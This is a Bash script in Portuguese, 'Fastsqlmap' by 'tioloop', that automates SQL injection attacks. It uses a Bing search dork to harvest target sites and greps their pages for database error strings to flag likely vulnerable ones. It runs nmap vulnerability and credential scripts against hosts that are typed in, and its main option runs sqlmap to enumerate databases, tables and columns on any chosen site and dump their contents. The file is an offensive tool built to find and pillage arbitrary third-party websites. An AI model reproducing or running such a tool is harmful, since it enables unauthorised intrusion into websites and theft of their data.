#!/bin/bash
# Script automatisado do sqlmap !
# autor : by tioloop
# telegram : @tioloop
# versao : v1.0 beta
# data : 25/10/2018
# Organizacao : BL4CK_SH1ELD
#
# esquema de cores 
VERMELHO="\033[0;31m"
VERDE="\033[0;32m"
AZUL="\033[0;36m"
BRANCO="\033[1;37m"
VERDE2="\033[1;32m"
VERMELHO2="\033[1;31m"


# criando menu
menu () {
# Criando banner do Script !
echo -e "$VERMELHO2 
   __                                
  |_   _   _ |_  _  _  |  _   _   _  
  |   (_| _) |_ _) (_| | ||| (_| |_) 
                     |           |
        by Tioloop v1.0 beta "
# Fim do Banner 

# Criando Menu
echo -e $AZUL "Fastsqlmap um Script desenvolvido para automatização \n do Programa Sqlmap ! "   
echo
while true 
do
echo -e $VERDE2 " 1 - Instalar sqlmap "
echo -e $VERDE2 " 2 - Procura sites Vulneraveis "
echo -e $VERDE2 " 3 - Scanner Nmap avanced " 
echo -e $VERDE2 " 4 - Fazer Injeção Sql " 
echo -e $VERDE2 " 5 - Sair "                         
echo
read -p "NUMERO ==>>> " Numero                                
# instalando sqlmap 
instalar () {
 # Verificando se existe o programa sqlmap !
Sq=$(which sqlmap)
if [ -z "$Sq" ]
then
echo
echo -e $VERMELHO2"O Programa Nao existe "
echo
apt-get install python -y && apt-get install sqlmap -y
sleep 2
clear
menu
else
echo
echo -e $VERDE2"Programa Instalado ! "
sleep 2
echo
menu
fi 
        }  

 # Fim da instalação do sqlmap
                                
Procura () { 
echo
echo -e $AZUL "checando o Curl..."
sleep 1
Curl=$(which curl)
if [ -z "$Curl" ];then
echo
echo -e $VERMELHO " Curl Não instalado ! " 
echo " Instalando o Curl...." 
sleep 2
sudo apt-get install curl -y                                 
 clear                           
else 
echo
echo -e $VERDE2 "Curl Instalado ! "
echo
                                    fi                                   
# Criando banner do menu 2
banner () {
echo -e $VERMELHO2"                           
  __                        
 (_   _  _  |\ |  _  _  | . 
 __) (_ (_| | \| _) (_| | | 
                      |     
     by tioloop v1.0 beta "
echo           
            
            
            
           }
banner
          
checksqli() {
       
         
for url in $(cat sites.txt); do


printf "\e[1;93mScanning:\e[0m\e[77m %s\e[0m\n" $url

checkurl=$(curl -s "$url" | grep -o 'SQL syntax\|mysql_fetch_assoc\|mysql_fetch_array\|mysql_num_rows\|is_writable\|mysql_result\|pg_exec\|mysql_query\|pg_query\|System Error\|io_error\|privilege_not_granted\|getimagesize\|preg_match\|DB Error'; echo $?)

if [[ $checkurk == 0 ]]; then

printf "\e[1;92m [*] Possible Vulnerable target:\e[1;77m %s\ne[0m" $url

fi

done



}

page=0

#dominios=(ac ad ae af ag ai al am an ao aq ar as at au aw ax az ba bb bd be bf bg bh bi bj bm bn bo br bs bt bv bw by bz ca cc cd cf cg ch ci ck cl cm cn co cr cu cv cx cv cz de dj dk dm do dz ec ee eg eh er es et eu fi fj fk fm fo fr ga gb gd ge gf gg gh )

read -p $'\e[1;92m[+] Sua Dork ->> \e[0m' dork

printf "\e[1;92m[+] Pesquisando alvos, por favor aguarde...\e[0m\n"


pages=100

while [[ $page -lt $pages ]]; do

#for domain in ${domains[@]}; do

curl -s 'https://www.bing.com/search?q='$dork'&first='$page'&FORM=PORE' >> file1

let page+=10

#done

done

grep -o 'href="http[^"]*"' file1 > file2

sed -i '/microsoft/d' ./file2

sed -i '/wordpress/d' ./file2

sed -i '/bing/d' ./file2

cat file2 | sort | uniq | cut -d "\"" -f2 | tr -d '\"' > sites.txt

printf "\e[1;92m[+] Resultados:\n\e[0m\e[1;77m"

cat sites.txt

printf "\e[0m\n"

printf "\e[1;92m[+] Salvo:\e[0m\e[1;77m sites.txt\e[0m\n"


rm -rf file*

default_search="Y"

read -p $'\e[1;92m[+] Pesquisar erros de banco de dados em destinos? \e[0m\e[1;77m[Y/n]\e[0m' search

search="${search:-${default_search}}"

if [[ $search == "y" || $search == "Y" || $search == "Yes" || $search == "yes" ]]; then

checksqli

else
echo
sleep 2
clear
menu

                                            fi
                                        }
# Fim do programa !
                          
# Criando Scanner ! 
Scanner () {
# criando o banner do Scanner 
Banscan () {
echo -e $VERMELHO2" 
  __                      
 (_   _  _   _   _   _  _ 
 __) (_ (_| | ) | ) (- |  
   by Tioloop v1.0 beta "                       
echo
echo -e $AZUL "Checando o Programa Nmap !"
NMAP=$( which nmap )
if [ -z "$NMAP" ];then
echo
echo -e $VERMELHO2 "Nmap Não instalado ! "
echo
sleep 1
echo -e $VERDE2 "Instalando o Nmap....." 
sudo apt-get install nmap -y 
sleep 1 
echo
clear
echo -e $AZUL "Executando o Script Novamente ! .... " 
echo
menu
else
echo
echo -e $VERDE2 "Nmap Instalado ! " 
              
               fi            
              }
Banscan                           
# Fim do banner do Scanner 
# criando submenu do Scanner
while true 
 do 
echo
echo -e $VERDE2 "a - [+] Scanner Http Sql-injection "
echo -e $VERDE2 "b - [+] Scanner Mysql-database "         
echo -e $VERDE2 "c - [+] Scanner http-vuln-wnr1000" 
echo -e $VERMELHO2 "d - [+] Menu "
echo -e $VERDE2
read -p " Digite a Letra ->> " LETRA
 
if [ "$LETRA" = "a" ];then
clear
echo                   
read -p "Digite o host ->> " HOST1                 
echo
nmap -v --script=http-sql-injection $HOST1
echo
read -p "ENTER [   ] " 

               fi

if [ "$LETRA" = "b" ];then   
clear
read -p "Digite o Host ->> " HOST2
echo 
nmap -v --script=mysql-databases $HOST2                                       
echo
read -p "ENTER [   ] "
                    
                    fi
                    
if [ "$LETRA" = "c" ];then
clear
read -p "Digite o Host ->> " HOST3
echo
nmap -v --script=http-vuln-wnr1000-creds $HOST3
echo
read -p "ENTER [   ] "
                   fi
            
if [ "$LETRA" = "d" ];then                   
clear                 
menu            
                   fi
                   
                   
                   done               
                   }
                 
injecao () {                 
clear
echo -e $VERMELHO2 "
  __                             
 |_   _   _ |_  _  |  _   _   _  
 |   (_| _) |_ (_| | ||| (_| |_) 
                 |           |   
             by tioloop v1.0 beta"
echo
while true 
 do
read -p "Site.php?id= -->> " Site2 
clear            
sqlmap -u $Site2 --dbs --random-agent --level 1 --risk 1 --batch 
echo
echo "1 - [+] Nome database"
echo "2 - [+] tenta outro site "
echo "3 - [+] Menu " 
echo
read -p "NEMERO -->>> " NUMER0
database () {
 read -p "Digite a Database ->>> " Data1    
 clear 
 sqlmap -u $Site2 --dbs -D $Data1 --tables                                      
                  
                  }                  
           
Tabless () {
 echo
 read -p "Tables ->>> " Tabless
 sqlmap -u $Site2 --dbs -D $Data1 -T $Tabless --columns                  
                  }
                 
dump () {
echo 
echo -e $BANCO 1 -"Volta ao Tables "
echo
read -p "Dump ->>> " Dump

 if [ "$Dump" = "1" ];then
sqlmap -u $Site2 --dbs -D $Data1 --tables
Tabless           
dump          
                    
                                    
 else                   
sqlmap -u $Site2 --dbs -D $Data1 -T $Tabless -C $Dump --dump                   
echo

echo -e " 1 - Volta ao tables "
echo -e " 2 - Volta ao columns "
echo                   
read -p "Numero ->>> " NUMER01                 
                     fi   
      }             
                  
if [ "$NUMER0" = "1" ];then             
database
Tabless
dump
                  fi                  

                  
if [ "$NUMER0" = "2" ];then                       
 injecao       
                  fi
                  
if [ "$NUMER0" = "3" ];then                
menu
                              
                  fi                 
while true ;do
 if [ "$NUMER01" = "1" ];then

sqlmap -u $Site2 --dbs -D $Data1 --tables
 Tabless           
 dump                
                    
                    fi
                  
 if [ "$NUMER01" = "2" ];then       

sqlmap -u $Site2 --dbs -D $Data1 -T $Tabless --columns 
dump                   
                    
                    
                    fi
       
           
                    
                    done
                   
                   done           
                 
      
                 }
      
 # Fim do programa injecao sql 
sair () { 
 
echo -e -n $BRANCO "Obrigado " 
echo -n  
horas=`date | cut -d" " -f4 | cut -d: -f1`

if (("$horas" >= "06")) && (("$horas" <= "12"))

then

	echo -e "Bom dia!"
                    fi
if (("$horas" > "12")) && (("$horas" < "18"))

then

	echo -e "Boa tarde!"

else

	echo -e "Boa noite!"

fi             

exit 0                                      
                   
                   }            
                 
case $Numero in
 1) instalar;;
 2) Procura;;
 3) Scanner;;
 4) injecao;;
 5) sair;;
  *) echo ; echo -e $VERMELHO "opcao invalida !" && sleep 1 && menu
     esac   

                        
                        
                        
                        
                        
                        done
}                           
menu           


